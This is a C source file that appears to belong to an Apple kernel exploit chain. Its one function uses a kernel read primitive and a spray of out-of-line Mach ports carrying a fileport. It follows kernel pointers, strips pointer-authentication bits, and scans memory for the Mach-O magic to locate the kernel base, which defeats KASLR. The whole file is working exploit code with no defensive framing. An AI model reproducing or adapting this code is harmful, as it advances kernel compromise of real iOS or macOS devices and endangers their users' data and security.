#include "kernel_base.h"

#include "kernel_rw.h"
#include "port_utils.h"
#include "spray.h"
#include "xpaci.h" // ptrauth.h replacement
#include "kernel_rw.h"

#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations" // syscall

uint64_t kernel_base_from_holder(mach_port_t holder, uint64_t holder_addr)
{
    uint64_t kernel_base = 0;
    const int receive_size = 0x10000; // Doesn't really matter
    const int data_kalloc_size = 0x50; // Doesn't really matter
    uint8_t *buf = calloc(1, receive_size);
    mach_port_t fileport = MACH_PORT_NULL;
    
    // read out port pointer
    uint64_t port_addr = mcbc_kread64(holder_addr + 8);
    
    // init fileport
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    syscall(SYS_fileport_makeport, sock, &fileport);
    
    // send new message contaning port
    mcbc_port_receive_msg(holder, buf, receive_size);
    mcbc_spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(sizeof(void *), &fileport, data_kalloc_size, holder);
    
    // read kernel text pointer fops
    uint64_t kmsg = mcbc_kread64(port_addr + 0x30);
    uint64_t ikm_header = xpaci(mcbc_kread64(kmsg + 0x18));
    uint64_t oolp_array = mcbc_kread64(ikm_header + 0x24);
    uint64_t oolp = mcbc_kread64(oolp_array);
    uint64_t kobject = xpaci(mcbc_kread64(oolp + 0x58));
    uint64_t fops = mcbc_kread64(kobject + 0x28);
    
    // find kernel base
    uint64_t pos = (fops & ~0x3FFF);
    do
    {
        pos -= 0x4000;
    } while (mcbc_kread32(pos) != 0xFEEDFACF);
    kernel_base = pos;
    
    // cleanup
    close(sock);
    mcbc_port_deallocate_n(&fileport, 1);
    
    return kernel_base;
}
